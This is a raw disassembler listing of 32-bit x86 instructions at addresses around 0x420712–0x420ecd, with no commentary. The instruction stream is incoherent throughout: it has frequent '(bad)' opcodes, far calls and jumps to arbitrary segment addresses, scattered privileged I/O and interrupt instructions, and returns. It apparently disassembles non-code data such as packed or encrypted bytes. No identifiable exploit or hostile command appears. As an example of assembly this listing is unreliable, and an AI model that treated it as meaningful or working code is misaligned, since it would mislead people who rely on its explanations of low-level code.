  420712:	pop    ebx
  420713:	pop    ss
  420714:	and    edi,DWORD PTR [esi-0x303cf37f]
  42071a:	xor    DWORD PTR [esi-0x50721707],ebp
  420720:	sub    ah,BYTE PTR [ecx+eiz*2+0x2e]
  420724:	mov    edx,0x84fd2bd6
  420729:	test   BYTE PTR [edi*4+0x31ca2b09],dh
  420730:	push   edx
  420731:	call   0xb1d3:0x7082e080
  420738:	aaa    
  420739:	mov    WORD PTR ds:0x4da4b9bc,fs
  42073f:	int    0x1d
  420741:	mov    al,0xf3
  420743:	push   eax
  420744:	ret    
  420745:	ins    BYTE PTR es:[edi],dx
  420746:	mov    WORD PTR gs:[ecx-0x1],es
  42074a:	dec    esp
  42074b:	ret    0x3e50
  42074e:	mov    DWORD PTR [ecx-0x51],eax
  420751:	ror    esi,0xf7
  420754:	pop    ds
  420755:	stos   BYTE PTR es:[edi],al
  420756:	ds mov ch,0xd9
  420759:	mov    eax,0xde41d4b1
  42075e:	enter  0x5a1f,0x6e
  420762:	stos   BYTE PTR es:[edi],al
  420763:	or     ah,BYTE PTR [ebx-0x17]
  420766:	xchg   esi,eax
  420767:	or     dl,BYTE PTR [edx]
  420769:	mov    edx,0x76ecb34
  42076e:	rcr    DWORD PTR [edx-0x197625f4],0x6d
  420775:	push   edx
  420776:	dec    edx
  420777:	xchg   esi,eax
  420778:	imul   BYTE PTR [ebx+0x41]
  42077b:	add    esp,DWORD PTR [ebp+0x6c93e98d]
  420781:	fld    DWORD PTR ds:[eax]
  420784:	jle    0x4207bf
  420786:	mov    edx,0x60bf34f6
  42078b:	pop    ds
  42078c:	adc    al,0x52
  42078e:	jl     0x42075b
  420790:	rol    esi,cl
  420792:	adc    DWORD PTR [edi],eax
  420794:	push   cs
  420795:	rol    BYTE PTR gs:[eax+ebx*4],1
  420799:	fiadd  DWORD PTR [edx+ebp*2]
  42079c:	cwde   
  42079d:	or     ecx,DWORD PTR [ecx]
  42079f:	shl    BYTE PTR [edx+ecx*8+0x30],cl
  4207a3:	push   es
  4207a4:	xor    al,0x53
  4207a6:	fwait
  4207a7:	add    dl,BYTE PTR [ebx-0x9]
  4207aa:	push   esp
  4207ab:	stos   DWORD PTR es:[edi],eax
  4207ac:	mov    bl,0x3b
  4207ae:	sbb    dl,BYTE PTR [edi+edi*8]
  4207b1:	(bad)  
  4207b3:	jns    0x42076e
  4207b5:	les    ebp,FWORD PTR [esi+0x76]
  4207b8:	mov    cl,0x72
  4207ba:	and    DWORD PTR [ecx+0x2a7b5914],edx
  4207c0:	daa    
  4207c1:	ss pushf 
  4207c3:	rcl    BYTE PTR [edx],0x49
  4207c6:	sbb    dh,bl
  4207c8:	mov    WORD PTR [esi+esi*4],ss
  4207cb:	jo     0x4207ff
  4207cd:	ins    DWORD PTR es:[edi],dx
  4207ce:	adc    edi,DWORD PTR [ebp+0x5a]
  4207d1:	dec    ebx
  4207d2:	push   esp
  4207d3:	ja     0x420792
  4207d5:	cli    
  4207d6:	push   esi
  4207d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d8:	push   eax
  4207d9:	inc    ecx
  4207da:	xchg   edx,eax
  4207db:	retf   
  4207dc:	lods   eax,DWORD PTR ds:[esi]
  4207dd:	inc    ebx
  4207de:	out    0x96,eax
  4207e0:	gs loopne 0x4207be
  4207e3:	inc    ebp
  4207e4:	jne    0x4207d3
  4207e6:	pop    ecx
  4207e7:	cmp    eax,0x40824a71
  4207ec:	sbb    eax,0x4ee04ea5
  4207f1:	sahf   
  4207f2:	dec    dx
  4207f4:	cmp    DWORD PTR [ebx+0xa968a35],ebx
  4207fa:	mov    DWORD PTR [edx-0x76],ecx
  4207fd:	cld    
  4207fe:	mov    ch,0xbe
  420800:	ins    BYTE PTR es:[edi],dx
  420801:	mov    ch,0x89
  420803:	(bad)  
  420805:	into   
  420806:	(bad)  
  420807:	mov    ch,0x8b
  420809:	inc    esp
  42080a:	mov    edx,0x8f74581f
  42080f:	cmp    eax,edi
  420811:	cs dec edi
  420813:	sub    BYTE PTR [ecx-0x5ebc408a],cl
  420819:	loopne 0x42084e
  42081b:	push   ebp
  42081c:	stos   DWORD PTR es:[edi],eax
  42081d:	loope  0x420834
  42081f:	repnz outs dx,DWORD PTR gs:[esi]
  420822:	or     eax,0x78
  420827:	add    BYTE PTR [eax],al
  420829:	add    BYTE PTR [ebp+ecx*2+0x4a],al
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x4904921e
  420837:	xor    DWORD PTR [eax+0xb],eax
  42083a:	pop    eax
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	add    BYTE PTR [esi],0x0
  420841:	add    BYTE PTR [ecx],cl
  420843:	inc    edx
  420844:	fimul  WORD PTR [edx+0x1e300d32]
  42084a:	lock lock adc bl,dl
  42084e:	pop    ds
  42084f:	push   cs
  420850:	adc    DWORD PTR [edi],ebp
  420852:	js     0x42081f
  420854:	into   
  420855:	cmc    
  420856:	popa   
  420857:	and    BYTE PTR [ecx-0x31],dl
  42085a:	sbb    eax,0x449461f1
  42085f:	sub    edi,DWORD PTR [edi]
  420861:	add    ah,BYTE PTR [esi-0x38]
  420864:	fist   WORD PTR [ebx-0x55]
  420867:	add    al,0xe0
  420869:	pop    ebx
  42086a:	addr16 (bad) 
  42086c:	sar    DWORD PTR [esi-0x57],cl
  42086f:	mov    bl,0xbc
  420871:	in     al,dx
  420872:	mov    bl,0xd5
  420874:	jae    0x42084f
  420876:	push   ds
  420877:	jmp    0x4208e6
  420879:	sbb    eax,DWORD PTR [edx-0xc]
  42087c:	add    al,0x80
  42087e:	sub    BYTE PTR [edi],cl
  420880:	(bad)  
  420881:	fiadd  DWORD PTR [edi]
  420883:	or     al,0xc4
  420885:	pop    esp
  420886:	and    BYTE PTR [ebx+0x2fde431],bh
  42088c:	push   0x69
  42088e:	(bad)  
  42088f:	test   al,0xcc
  420891:	lds    edx,FWORD PTR [edi+0x5109e1f2]
  420897:	jl     0x420854
  420899:	lock sbb eax,DWORD PTR [edi+0x2b]
  42089d:	repnz lahf 
  42089f:	sub    al,0xb4
  4208a1:	add    eax,0x15eb6f9b
  4208a6:	push   ds
  4208a7:	repz xchg ebp,eax
  4208a9:	and    eax,0x78f60c74
  4208ae:	mov    dh,0x41
  4208b0:	jae    0x4208d1
  4208b2:	stos   DWORD PTR es:[edi],eax
  4208b3:	or     DWORD PTR [ebp+0x133525ad],ebp
  4208b9:	xor    ch,0xa8
  4208bc:	and    al,0xa6
  4208be:	push   ebp
  4208c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c1:	jge    0x420885
  4208c3:	xchg   esi,eax
  4208c4:	mov    dh,0xb0
  4208c6:	inc    edi
  4208c7:	retf   
  4208c8:	test   eax,0xb11d4fa3
  4208cd:	adc    BYTE PTR [ebx+0x18],cl
  4208d0:	push   edx
  4208d1:	push   cs
  4208d2:	imul   esi,DWORD PTR [eax+0x2db5262a],0xffffff9a
  4208d9:	pop    ebp
  4208da:	fwait
  4208db:	mov    eax,ds:0x44b3be73
  4208e0:	sub    edx,ecx
  4208e2:	cdq    
  4208e3:	nop
  4208e4:	lods   eax,DWORD PTR ds:[esi]
  4208e5:	jecxz  0x420935
  4208e7:	out    0x73,eax
  4208e9:	push   es
  4208ea:	(bad)  
  4208eb:	jp     0x420882
  4208ed:	lahf   
  4208ee:	mov    eax,0x5ff7953e
  4208f3:	push   cs
  4208f4:	push   esp
  4208f5:	call   0x9719b193
  4208fa:	stc    
  4208fb:	add    al,0x6e
  4208fd:	retf   0x8a3f
  420900:	push   cs
  420901:	test   eax,0x78bb3e64
  420906:	mov    eax,ds:0x6b6746ca
  42090b:	hlt    
  42090c:	mov    ah,0x83
  42090e:	mov    esi,0x98046ac4
  420913:	shl    DWORD PTR [eax-0x96a24ef],1
  420919:	je     0x4208ec
  42091b:	out    dx,al
  42091c:	mov    BYTE PTR [ebx-0x7e44805c],dh
  420922:	aam    0x8d
  420924:	repnz sub BYTE PTR [ebx],ch
  420927:	mov    ds:0x66812a79,eax
  42092c:	jp     0x420967
  42092e:	scas   eax,DWORD PTR es:[edi]
  42092f:	pop    ds
  420930:	xor    al,0xb7
  420932:	arpl   WORD PTR [bx+si],bp
  420935:	retf   
  420936:	out    0xc2,al
  420938:	inc    ebx
  420939:	js     0x42090e
  42093b:	inc    ecx
  42093c:	mov    ch,0x40
  42093e:	sbb    DWORD PTR [eax+0x18],0xffffffa3
  420942:	add    edi,esi
  420944:	mov    ch,BYTE PTR [ecx-0x7e]
  420947:	lods   eax,DWORD PTR ds:[esi]
  420948:	sahf   
  420949:	gs test eax,0xc35cb1e0
  42094f:	scas   al,BYTE PTR es:[edi]
  420950:	cmp    bl,BYTE PTR [edx]
  420952:	jmp    0xf11cbc69
  420957:	jbe    0x4209b6
  420959:	pop    eax
  42095a:	imul   ecx,DWORD PTR [ebx-0x6ab9183a],0xeba6182d
  420964:	lods   al,BYTE PTR ds:[esi]
  420965:	and    bh,BYTE PTR [edx+0x5a3b87f1]
  42096b:	push   ebp
  42096c:	and    al,0xe6
  42096e:	adc    dh,BYTE PTR [ecx-0x5d]
  420971:	xor    ch,BYTE PTR [eax-0x3d]
  420974:	mov    DWORD PTR [edi],ebp
  420976:	pop    ecx
  420978:	pop    edx
  420979:	jbe    0x4209bb
  42097b:	inc    esp
  42097c:	repz mov ebx,DWORD PTR [eax]
  42097f:	clc    
  420980:	cmp    edi,ecx
  420982:	lock popf 
  420984:	lea    esi,[ecx+0x3d]
  420987:	push   0xffffff98
  420989:	sub    ecx,DWORD PTR [edi-0x49]
  42098c:	mov    edx,0x9f86eabc
  420991:	clc    
  420992:	sbb    dl,BYTE PTR [ebp+0x7b46558a]
  420998:	sub    BYTE PTR [ebp+0x53ba682b],0x5f
  42099f:	(bad)  
  4209a0:	push   edi
  4209a1:	retf   0xb77a
  4209a4:	scas   eax,DWORD PTR es:[edi]
  4209a5:	pop    esi
  4209a6:	les    ecx,FWORD PTR [edi+0x40d44a1b]
  4209ac:	push   edx
  4209ad:	stos   DWORD PTR es:[edi],eax
  4209ae:	addr16 sbb bh,0xaf
  4209b2:	cmp    BYTE PTR [ebx+0x696366d1],ah
  4209b8:	shl    DWORD PTR [edi+0x4f],1
  4209bb:	cmp    BYTE PTR [eax],ah
  4209bd:	mov    ebp,0x8f224fe4
  4209c2:	xchg   ebx,eax
  4209c3:	pop    es
  4209c4:	push   ebx
  4209c5:	in     eax,dx
  4209c6:	pop    esp
  4209c7:	aad    0xcd
  4209c9:	lahf   
  4209ca:	test   DWORD PTR [ebx+0x1f],eax
  4209cd:	dec    edx
  4209ce:	adc    eax,0x6ee216c0
  4209d3:	mov    dh,BYTE PTR [esi-0x2bdbfe53]
  4209d9:	add    BYTE PTR [edx-0x4b],0xdc
  4209dd:	xchg   BYTE PTR [ebp+0x3d8c69ea],cl
  4209e3:	fs out dx,eax
  4209e5:	sbb    esp,0xc2fca69d
  4209eb:	jbe    0x4209f2
  4209ed:	sbb    al,0x86
  4209ef:	pop    ebp
  4209f0:	(bad)  
  4209f1:	enter  0x820,0x50
  4209f5:	sub    DWORD PTR [ecx+edi*1-0x13],0xffffffe9
  4209fa:	fnstsw WORD PTR [eax]
  4209fc:	jno    0x4209bb
  4209fe:	ret    
  4209ff:	ret    
  420a00:	pop    esi
  420a01:	adc    ah,ch
  420a03:	mov    ebx,ds
  420a05:	aam    0x9f
  420a07:	adc    eax,0x806f64a8
  420a0c:	push   ecx
  420a0d:	push   es
  420a0e:	inc    edi
  420a0f:	lods   al,BYTE PTR ds:[esi]
  420a10:	xor    al,0x0
  420a12:	mov    eax,fs:0x75446238
  420a18:	repz jg 0x42099e
  420a1b:	stos   DWORD PTR es:[edi],eax
  420a1c:	mov    edx,0xb84dd013
  420a21:	jno    0x420a41
  420a23:	mov    al,ds:0x526a8711
  420a28:	push   ds
  420a29:	aam    0xf7
  420a2b:	xor    bl,BYTE PTR [edi+eiz*2]
  420a2e:	repz out 0x74,eax
  420a31:	repz (bad) 
  420a34:	push   cs
  420a35:	or     al,0x95
  420a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a38:	rol    DWORD PTR [ecx+ebp*8-0x56a389c8],1
  420a3f:	jle    0x420aa5
  420a41:	mov    dl,0x9a
  420a43:	pusha  
  420a44:	fmul   DWORD PTR [ecx]
  420a46:	add    eax,esi
  420a48:	out    0xd7,al
  420a4a:	mov    eax,0xa1bf5013
  420a4f:	mov    al,0x71
  420a51:	pop    es
  420a52:	fist   WORD PTR [edi-0x68]
  420a55:	jmp    0x29a4:0xe50b3223
  420a5c:	outs   dx,BYTE PTR ds:[esi]
  420a5d:	inc    ecx
  420a5e:	pop    ecx
  420a5f:	push   edx
  420a60:	pop    edi
  420a61:	mov    ah,0xe7
  420a63:	cdq    
  420a64:	cmp    eax,0xde021110
  420a69:	sub    DWORD PTR [ebp-0x591796],ebx
  420a6f:	pop    ss
  420a70:	imul   eax,DWORD PTR [ebp-0xe67e0f0],0x7
  420a77:	outs   dx,DWORD PTR ds:[esi]
  420a78:	sti    
  420a79:	sbb    cl,dh
  420a7b:	push   edx
  420a7c:	and    DWORD PTR [ebp-0xf3eaebf],edi
  420a82:	leave  
  420a83:	call   0xb3c6148d
  420a88:	xor    DWORD PTR [edx],esp
  420a8a:	inc    edx
  420a8b:	lods   eax,DWORD PTR ds:[esi]
  420a8c:	retf   0xf355
  420a8f:	adc    eax,0xec18c93a
  420a94:	adc    esi,edx
  420a96:	jno    0x420aa8
  420a98:	xor    esp,ebx
  420a9a:	fmul   DWORD PTR [ecx-0x655e9ab9]
  420aa0:	fadd   DWORD PTR [ebp-0x56]
  420aa3:	dec    edi
  420aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa5:	out    dx,al
  420aa6:	mov    edx,0xa8a4b2ea
  420aab:	xchg   esi,eax
  420aac:	neg    BYTE PTR ds:[ebp+0x3c08a161]
  420ab3:	fcomp  QWORD PTR ds:0xe547149c
  420ab9:	push   ds
  420aba:	jne    0x420b39
  420abc:	xchg   ebx,eax
  420abd:	cmp    DWORD PTR [ebx-0x35108e42],ecx
  420ac3:	lds    esi,FWORD PTR [esp+ecx*1-0x7d]
  420ac7:	and    al,0x23
  420ac9:	add    al,0xa5
  420acb:	out    0x64,al
  420acd:	add    DWORD PTR [esi],edi
  420acf:	jo     0x420af7
  420ad1:	pop    edx
  420ad2:	mov    esi,0xd571e0c6
  420ad7:	imul   eax,DWORD PTR [eax-0x13],0xffffff92
  420adb:	sub    cl,BYTE PTR [edx-0x7c6d525d]
  420ae1:	mov    bh,0x59
  420ae3:	sbb    dl,al
  420ae5:	cld    
  420ae6:	cmp    DWORD PTR [ebx-0x59a756c],ecx
  420aec:	ins    DWORD PTR es:[edi],dx
  420aed:	pushf  
  420aee:	xchg   ecx,eax
  420aef:	adc    BYTE PTR [ecx],dh
  420af1:	jns    0x420b5b
  420af3:	shr    dh,1
  420af5:	mov    ebp,0x3535277
  420afa:	outs   dx,DWORD PTR ds:[esi]
  420afb:	ds fdiv st,st(3)
  420afe:	ins    DWORD PTR es:[edi],dx
  420aff:	sub    BYTE PTR [edi-0x3b651e8a],ch
  420b05:	fist   DWORD PTR [eax]
  420b07:	inc    edx
  420b08:	pusha  
  420b09:	adc    ebx,ebx
  420b0b:	aam    0x34
  420b0d:	dec    ebp
  420b0e:	pop    eax
  420b0f:	add    cl,BYTE PTR [eax+ecx*8]
  420b12:	pop    ss
  420b13:	(bad)  [edx+0x35]
  420b16:	cwde   
  420b17:	xor    al,0x77
  420b19:	dec    ebp
  420b1a:	inc    eax
  420b1b:	scas   eax,DWORD PTR es:[edi]
  420b1c:	mov    BYTE PTR [edx+edi*4],0xc5
  420b20:	and    cl,BYTE PTR [ebp-0x1c]
  420b23:	and    al,0xaf
  420b25:	test   DWORD PTR [edi],ebp
  420b27:	push   ds
  420b28:	fimul  WORD PTR [edx]
  420b2a:	push   ebp
  420b2b:	data16 cli 
  420b2d:	jns    0x420aea
  420b2f:	es xchg esi,eax
  420b31:	aaa    
  420b32:	mov    esi,0x36c10ccb
  420b37:	rcr    DWORD PTR [ebx],0x7
  420b3a:	loopne 0x420afd
  420b3c:	mov    al,0xbd
  420b3e:	xchg   esp,eax
  420b3f:	mov    ds:0x9507cb69,al
  420b44:	mov    al,0x48
  420b46:	int    0x75
  420b48:	fdivr  st,st(7)
  420b4a:	inc    eax
  420b4b:	xor    ebx,edi
  420b4d:	and    edx,edx
  420b4f:	cwde   
  420b50:	push   ebp
  420b51:	xchg   ecx,ebp
  420b53:	sar    BYTE PTR [ebp-0x7b8081e3],cl
  420b59:	adc    eax,0xc0dae08b
  420b5e:	mov    eax,0x3d0a623c
  420b63:	push   ebx
  420b64:	fwait
  420b65:	call   0xe84bb821
  420b6a:	cmp    eax,0xad43e78f
  420b6f:	sub    bl,BYTE PTR [eax]
  420b71:	sub    BYTE PTR [eax],cl
  420b73:	test   BYTE PTR ds:[edx+0x75],dl
  420b77:	mov    DWORD PTR [eax+0x16],0x329c8f73
  420b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b7f:	(bad)  
  420b80:	repz out 0xe7,eax
  420b83:	into   
  420b84:	inc    edx
  420b85:	popf   
  420b86:	xchg   ecx,eax
  420b87:	add    ah,bl
  420b89:	fwait
  420b8a:	iret   
  420b8b:	mov    esi,0x92687a8c
  420b90:	dec    ecx
  420b91:	pop    edx
  420b92:	repnz mov ebp,0x36137a40
  420b98:	adc    BYTE PTR [esi+edx*4+0x6730c435],0x16
  420ba0:	cdq    
  420ba1:	or     DWORD PTR [edx],eax
  420ba3:	pop    DWORD PTR [eax-0x495b3f6e]
  420ba9:	push   esp
  420baa:	ret    
  420bab:	sbb    BYTE PTR [esi-0x26d3cd7e],al
  420bb1:	or     eax,0xd13c071b
  420bb6:	cmp    edx,esp
  420bb8:	lahf   
  420bb9:	xchg   edi,eax
  420bba:	push   eax
  420bbb:	dec    BYTE PTR [edi+0x7174e9e0]
  420bc1:	daa    
  420bc2:	xchg   BYTE PTR [edx+ebx*8+0x21],dh
  420bc6:	ret    0xd5dd
  420bc9:	test   al,0xb1
  420bcb:	out    0x5d,eax
  420bcd:	or     BYTE PTR [ebp+0x21],0x18
  420bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd2:	test   eax,0xf2e6a16c
  420bd7:	stc    
  420bd8:	and    edx,DWORD PTR [ecx]
  420bda:	jb     0x420c3d
  420bdc:	gs xchg esp,eax
  420bde:	mov    eax,0x11f18951
  420be3:	jb     0x420b7a
  420be5:	and    edi,ebx
  420be7:	aad    0x44
  420be9:	les    esi,FWORD PTR [esp+eax*4-0x75526a3e]
  420bf0:	adc    al,0x60
  420bf2:	stos   BYTE PTR es:[edi],al
  420bf3:	xchg   esi,eax
  420bf4:	stc    
  420bf5:	add    bh,BYTE PTR [ecx]
  420bf7:	jo     0x420c23
  420bf9:	sbb    DWORD PTR [ebx+0x9476adf],ebx
  420bff:	test   DWORD PTR es:[eax-0x4a],ecx
  420c03:	fistp  QWORD PTR [ebx+ebp*1+0x63]
  420c07:	out    0x2d,al
  420c09:	sbb    eax,0x28f6e518
  420c0e:	inc    eax
  420c0f:	jmp    0x96a3:0x72c8acd8
  420c16:	loopne 0x420bc6
  420c18:	pop    ecx
  420c19:	inc    ecx
  420c1a:	mov    edx,0xb30b057b
  420c1f:	into   
  420c20:	call   0xf098:0xcafcfebb
  420c27:	aaa    
  420c28:	je     0x420c2f
  420c2a:	mov    edi,0x459ec5e9
  420c2f:	xor    bl,BYTE PTR [esi+0x67]
  420c32:	or     bh,BYTE PTR [eax]
  420c34:	rcr    DWORD PTR [ecx+edx*1-0x623a316c],1
  420c3b:	sub    al,0x58
  420c3d:	mov    WORD PTR [eax-0x5aec857f],?
  420c43:	pop    ss
  420c44:	push   es
  420c45:	jge    0x420c0b
  420c47:	jmp    0xc649a2da
  420c4c:	les    esi,FWORD PTR [eax+0xa]
  420c4f:	xchg   ebp,eax
  420c50:	jne    0x420c3d
  420c52:	test   BYTE PTR [edx+eax*8],cl
  420c55:	das    
  420c56:	paddb  mm4,mm7
  420c59:	adc    DWORD PTR [eax+0x19],edx
  420c5c:	mov    ds:0xaa184861,eax
  420c61:	jmp    FWORD PTR [eax-0x2e5ed0a9]
  420c67:	xchg   esi,eax
  420c68:	fadd   QWORD PTR [ebx-0x357e85f1]
  420c6e:	inc    edi
  420c6f:	rcr    DWORD PTR [esi+eiz*8],1
  420c72:	fiadd  WORD PTR [esi+eax*8]
  420c75:	add    al,0x25
  420c77:	inc    ebx
  420c78:	les    ecx,FWORD PTR [edx-0x59]
  420c7b:	xchg   edx,eax
  420c7c:	or     edi,DWORD PTR [edx-0x5d]
  420c7f:	sbb    BYTE PTR [ebx],cl
  420c81:	lahf   
  420c82:	dec    ebp
  420c83:	pop    ecx
  420c84:	jmp    0x420cee
  420c86:	add    edi,ebp
  420c88:	cwde   
  420c89:	fdivrp st(7),st
  420c8b:	mov    ebx,0x379caf04
  420c90:	mov    eax,ds:0x3218c953
  420c95:	push   edi
  420c96:	mov    esi,0x566b177b
  420c9b:	pop    ebp
  420c9c:	pop    ebp
  420c9d:	xchg   edx,eax
  420c9e:	bound  edi,QWORD PTR [ebx-0x7c]
  420ca1:	call   0xfe70:0x58147419
  420ca8:	mov    dl,0x3b
  420caa:	gs cdq 
  420cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cad:	sub    bh,cl
  420caf:	sub    ebp,DWORD PTR [ecx+0x10fa9113]
  420cb5:	mov    dl,0x30
  420cb7:	push   esp
  420cb8:	adc    DWORD PTR [esi+0x4949d8c8],0xcb52ea4c
  420cc2:	sbb    BYTE PTR [eax-0x5b],bl
  420cc5:	into   
  420cc6:	daa    
  420cc7:	jns    0x420d04
  420cc9:	ja     0x420cae
  420ccb:	cmp    BYTE PTR [ecx],0x1c
  420cce:	fcom   QWORD PTR [ecx-0x67]
  420cd1:	sahf   
  420cd2:	test   al,0x3f
  420cd5:	movups xmm1,XMMWORD PTR ds:0xc10dc7c3
  420cdc:	xchg   DWORD PTR [eax+eax*4],eax
  420cdf:	leave  
  420ce0:	call   0x4b7ffc9b
  420ce5:	in     al,dx
  420ce6:	enter  0x6639,0xf1
  420cea:	xchg   ecx,eax
  420ceb:	cmp    cl,bh
  420ced:	push   edx
  420cee:	or     al,0x6b
  420cf0:	or     al,0x7d
  420cf2:	loope  0x420ce4
  420cf4:	jmp    0x3740b7d0
  420cf9:	iret   
  420cfa:	push   ecx
  420cfb:	add    BYTE PTR [edi+eiz*8],cl
  420cfe:	inc    eax
  420cff:	int3   
  420d00:	xchg   bh,dh
  420d02:	sbb    BYTE PTR [edx+0x35],bh
  420d05:	pop    edi
  420d06:	test   eax,ebx
  420d08:	rcl    BYTE PTR [esi-0x23],1
  420d0b:	vpaddb ymm4,ymm2,YMMWORD PTR [eax-0x58c0089c]
  420d13:	aad    0xde
  420d15:	jns    0x420cfa
  420d17:	shr    BYTE PTR [ebp+0x3234d0d1],1
  420d1d:	push   ds
  420d1e:	sbb    eax,0xaa4d4eb8
  420d23:	jl     0x420ce7
  420d25:	mov    DWORD PTR [esp+esi*8+0x3168ac6d],esp
  420d2c:	repnz xchg edi,eax
  420d2e:	jmp    0x69466d83
  420d33:	jmp    0x420cd1
  420d35:	or     DWORD PTR ds:0x758fba29,edx
  420d3b:	inc    esi
  420d3c:	and    al,0x9d
  420d3e:	dec    eax
  420d3f:	aam    0xa6
  420d41:	fs ds in al,dx
  420d44:	mov    al,0x90
  420d46:	jmp    0x420ce6
  420d48:	sbb    eax,0xde7b0c15
  420d4d:	sar    BYTE PTR [esi+edx*4-0x69172c27],cl
  420d54:	push   eax
  420d55:	dec    esp
  420d56:	das    
  420d57:	es xchg ecx,eax
  420d59:	inc    edx
  420d5a:	cmp    DWORD PTR [esi+0xd],edx
  420d5d:	inc    esp
  420d5e:	es into 
  420d60:	hlt    
  420d61:	pop    ss
  420d62:	sbb    ebp,DWORD PTR [eax+0x48]
  420d65:	xlat   BYTE PTR ds:[ebx]
  420d66:	and    eax,0x33804330
  420d6b:	aaa    
  420d6c:	pop    edi
  420d6d:	mov    bh,0x56
  420d6f:	and    DWORD PTR [ecx-0xde9567a],edi
  420d75:	and    DWORD PTR [ebx+0x52],esi
  420d78:	ret    0xe2b6
  420d7b:	or     ah,BYTE PTR [edi+0x491e2428]
  420d81:	cdq    
  420d82:	and    DWORD PTR [ebx+0x59],edi
  420d85:	xor    BYTE PTR [edx+eiz*8-0x267013cf],bl
  420d8c:	inc    esp
  420d8d:	jmp    0x227d587c
  420d92:	add    bh,dh
  420d94:	rcr    BYTE PTR [eax],cl
  420d96:	inc    ebp
  420d97:	sbb    BYTE PTR [ebp+0x20],0x23
  420d9b:	inc    edx
  420d9c:	mov    bh,al
  420d9e:	sub    eax,ebp
  420da0:	icebp  
  420da1:	push   cs
  420da2:	xchg   BYTE PTR [ecx],dh
  420da4:	add    al,0xdc
  420da6:	xchg   ebx,edi
  420da8:	xor    DWORD PTR [edx-0x52],ebx
  420dab:	das    
  420dac:	fsubp  st(7),st
  420dae:	adc    DWORD PTR [ebp+edx*4+0x6a421503],esp
  420db5:	out    0x18,al
  420db7:	inc    eax
  420db8:	push   edx
  420db9:	nop
  420dba:	jns    0x420da8
  420dbc:	jbe    0x420d5c
  420dbe:	(bad)
  420dc3:	inc    esp
  420dc4:	ret    0x917f
  420dc7:	ret    
  420dc8:	inc    edi
  420dc9:	and    bl,bh
  420dcb:	les    esi,FWORD PTR [ecx+0x6d44ea18]
  420dd1:	mov    esp,0x973e99e3
  420dd6:	out    dx,al
  420dd7:	push   ebx
  420dd8:	mov    al,0x7a
  420dda:	dec    esp
  420ddb:	jne    0x420d89
  420ddd:	xchg   edx,eax
  420dde:	mov    ecx,0x42b3ce81
  420de3:	fdivr  st,st(5)
  420de5:	cwde   
  420de6:	mov    cl,0xca
  420de8:	lock xchg ecx,eax
  420dea:	mul    BYTE PTR [ecx]
  420dec:	mov    ds:0x32a6a15c,al
  420df1:	in     al,0x3b
  420df3:	gs push ds
  420df5:	push   edx
  420df6:	and    DWORD PTR [esi],0xffffff93
  420df9:	inc    ebp
  420dfa:	fstp   QWORD PTR [edx-0x18]
  420dfd:	mov    eax,ds:0x65a06475
  420e02:	retf   0x8c04
  420e05:	dec    ebp
  420e06:	std    
  420e07:	idiv   DWORD PTR [eax+0x2d374d39]
  420e0d:	cdq    
  420e0e:	stc    
  420e0f:	scas   al,BYTE PTR es:[edi]
  420e10:	jle    0x420d97
  420e12:	lahf   
  420e13:	mov    BYTE PTR [eax],al
  420e15:	pop    eax
  420e16:	sub    edi,ebx
  420e18:	into   
  420e19:	mov    dl,0x6c
  420e1b:	xchg   esi,eax
  420e1c:	(bad)  
  420e1d:	jae    0x420e72
  420e1f:	pop    ds
  420e20:	imul   ecx,DWORD PTR [ecx-0x65],0xffffff80
  420e24:	inc    edx
  420e25:	fsubr  QWORD PTR ds:0x40bcb71f
  420e2b:	mov    al,0x32
  420e2d:	push   eax
  420e2e:	lock rol BYTE PTR [ebp-0x11],1
  420e32:	mov    DWORD PTR [esi-0x7426ca1d],ecx
  420e38:	fimul  WORD PTR ds:0x598be2aa
  420e3e:	push   ebp
  420e3f:	xor    al,0x6a
  420e41:	inc    ecx
  420e42:	or     eax,0x86e1e9f5
  420e47:	out    0x3,al
  420e49:	sub    al,0xe8
  420e4b:	sub    cl,ah
  420e4d:	mov    al,ds:0xbe437d21
  420e52:	loopne 0x420e04
  420e54:	cli    
  420e55:	sbb    eax,0x69cc3f8b
  420e5a:	mov    ebx,0xee87980c
  420e5f:	addr16 lock retf 0x3b23
  420e64:	pop    ss
  420e65:	cmp    ebx,DWORD PTR [ebx+eax*8]
  420e68:	int    0x78
  420e6a:	mov    BYTE PTR [ecx+ebp*2],cl
  420e6d:	dec    ecx
  420e6e:	retf   0xc701
  420e71:	rcl    BYTE PTR [edi],cl
  420e73:	or     ecx,0xffffffb8
  420e76:	inc    ebp
  420e77:	add    al,0xda
  420e79:	idiv   esi
  420e7b:	jo     0x420ed2
  420e7d:	loope  0x420ef8
  420e7f:	sub    bh,BYTE PTR [ebp+0xb]
  420e82:	fadd   st(3),st
  420e84:	adc    al,BYTE PTR [ebx+ebx*4]
  420e87:	cdq    
  420e88:	mov    ch,0xf7
  420e8a:	ret    
  420e8b:	adc    ch,bl
  420e8d:	retf   
  420e8e:	push   esi
  420e8f:	push   es
  420e90:	sbb    bl,ah
  420e92:	and    BYTE PTR [eax],bh
  420e94:	push   cs
  420e95:	xchg   esp,eax
  420e96:	stos   BYTE PTR es:[edi],al
  420e97:	mov    al,ds:0x58cbfe00
  420e9c:	out    0x65,al
  420e9e:	xchg   esp,eax
  420e9f:	out    dx,eax
  420ea0:	mul    BYTE PTR [ebp-0x18]
  420ea3:	popa   
  420ea4:	ret    
  420ea5:	mov    ah,0xa6
  420ea7:	sar    DWORD PTR [ebp+0x26aeb4e8],0x87
  420eae:	add    bl,ch
  420eb0:	jmp    0x13b21edf
  420eb5:	fwait
  420eb6:	cmp    eax,DWORD PTR [ecx-0x1a]
  420eb9:	add    eax,0x3dd8baa0
  420ebe:	dec    esi
  420ebf:	xor    al,0x10
  420ec1:	jns    0x420e73
  420ec3:	inc    edi
  420ec4:	add    BYTE PTR [eax],al
  420ec6:	add    BYTE PTR [eax],al
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
